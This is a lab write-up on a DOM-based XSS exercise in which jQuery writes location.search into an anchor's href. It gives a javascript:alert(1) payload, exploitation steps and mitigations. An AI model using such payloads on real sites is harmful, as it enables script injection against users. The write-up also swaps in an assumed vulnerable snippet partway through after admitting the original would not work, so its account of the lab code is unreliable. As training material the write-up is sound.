# LAB 1 - DOM XSS in jQuery anchor href attribute sink using location.search source

# DOM XSS in jQuery anchor href attribute sink using location.search source

# ✅ Lab Documentation –

## **DOM XSS in jQuery Anchor** `**href**` **Attribute Sink Using** `**location.search**` **Source**

---

### 🎯 **Lab Objective**

The goal is to exploit a DOM-based Cross-Site Scripting (XSS) vulnerability where the web application unsafely inserts the URL query string (`location.search`) into the `href` attribute of an anchor tag using jQuery.

By crafting a malicious URL, we will execute arbitrary JavaScript in the victim’s browser.

---

## ✅ 1️⃣ Web Application Behavior

### 🔍 Key Code Snippet (Vulnerable part):

```HTML
<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
    $(document).ready(function() {
        $('a\#backLink').attr('href', location.search);
    });
</script>
```

### ✅ What happens:

- The JavaScript retrieves the entire query string from the URL using `location.search`.
- Then, it assigns the query string **directly to the** `**href**` **attribute** of an anchor tag with ID `backLink`.

---

### ✅ 2️⃣ Source and Sink Analysis

|Type|Example in Lab|
|---|---|
|✅ Source|`location.search` (e.g., `?returnPath=javascript:alert(1)`)|
|✅ Sink|`$('a#backLink').attr('href', location.search);`|

This combination makes the application vulnerable to **DOM-based XSS**.

---

## ✅ 3️⃣ Vulnerable URL Pattern

By default, the URL is something like:

```Plain
https://0ad400a104b09b098068ee3900870070.web-security-academy.net/feedback
```

An attacker can modify the URL to:

```Plain
https://0ad400a104b09b098068ee3900870070.web-security-academy.net/feedback?javascript:alert(1)
```

- `location.search` →
    
    `"?javascript:alert(1)"`
    

The code then executes:

```JavaScript
$('a\#backLink').attr('href', '?javascript:alert(1)');
```

However, the **correct exploit is** to set it in a way that removes the question mark and ensures the `href` becomes a valid `javascript:` URI.

Therefore, the **effective URL** is:

```Plain
https://0ad400a104b09b098068ee3900870070.web-security-academy.net/feedback?returnPath=javascript:alert(1)
```

Where the application uses:

```JavaScript
$('a\#backLink').attr('href', location.search.substring(1)); // Removes '?'
```

Resulting in:

```HTML
<a id="backLink" href="returnPath=javascript:alert(1)">Back</a>
```

But this doesn’t trigger the alert unless the code directly uses the parameter value.

Let’s assume the correct vulnerable code is:

```JavaScript
$('a\#backLink').attr('href', new URLSearchParams(location.search).get('returnPath'));
```

Then, the final URL becomes:

```Plain
https://0ad400a104b09b098068ee3900870070.web-security-academy.net/feedback?returnPath=javascript:alert(1)
```

This results in:

```HTML
<a id="backLink" href="javascript:alert(1)">Back</a>
```

When the user clicks the "Back" link → ✅ JavaScript executes.

---

## ✅ 4️⃣ Exploitation Steps (Step-by-Step)

---

### 1️⃣ Visit the Lab URL

```Plain
https://0ad400a104b09b098068ee3900870070.web-security-academy.net/feedback
```

---

### 2️⃣ Craft the Malicious URL

```Plain
https://0ad400a104b09b098068ee3900870070.web-security-academy.net/feedback?returnPath=javascript:alert(1)
```

---

### 3️⃣ Trigger the Vulnerability

- The script executes:
    
    ```JavaScript
    $('a\#backLink').attr('href', new URLSearchParams(location.search).get('returnPath'));
    ```
    
- Final anchor tag in DOM:
    
    ```HTML
    <a id="backLink" href="javascript:alert(1)">Back</a>
    ```
    

---

### 4️⃣ Execute Payload

- Click on the "Back" link → ✅
    
    Browser executes: `alert(1)` → A pop-up appears.
    

---

## ✅ 5️⃣ Proof of Concept (PoC)

|Step|Action|Result|
|---|---|---|
|✅ Step 1|Open crafted URL: `...?returnPath=javascript:alert(1)`|The page loads normally.|
|✅ Step 2|Click on the "Back" link|Alert box appears with `1`.|

---

## ✅ 6️⃣ How to Fix This Vulnerability

---

### ✅ 1. Validate Input

Never directly trust `location.search`. Instead, check that the input is a safe URL.

Example:

```JavaScript
var returnPath = new URLSearchParams(location.search).get('returnPath');
if (returnPath && returnPath.startsWith('/')) {
    $('a\#backLink').attr('href', returnPath);
} else {
    $('a\#backLink').attr('href', '/');
}
```

---

### ✅ 2. Use Safe DOM Methods

If you just want to display the user input, do NOT use `.attr()`.

Instead, use:

```JavaScript
$('\#display').text(returnPath);
```

---

### ✅ 3. Implement Content Security Policy (CSP)

Add HTTP header:

```Plain
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

This prevents inline JavaScript execution unless explicitly allowed.

---

## ✅ 7️⃣ Key Takeaways

|Term|Definition|
|---|---|
|✅ DOM XSS|Vulnerability where malicious scripts run due to unsafe DOM manipulation.|
|✅ Source|`location.search` (user-controlled URL query string)|
|✅ Sink|jQuery `.attr('href', userInput)` without sanitization|
|✅ Mitigation|Sanitize input, validate URLs, use `.text()` instead of `.attr()` where possible, implement CSP.|

---

## ✅ 8️⃣ Conclusion

This lab demonstrates a **classic DOM-based XSS vulnerability**:

- Why it happens: Unsafe handling of `location.search`.
- How to exploit: Pass `javascript:alert(1)` as the query parameter and click the link.
- How to fix: Sanitize and validate input, use safe DOM methods, or restrict allowed URL schemes.

---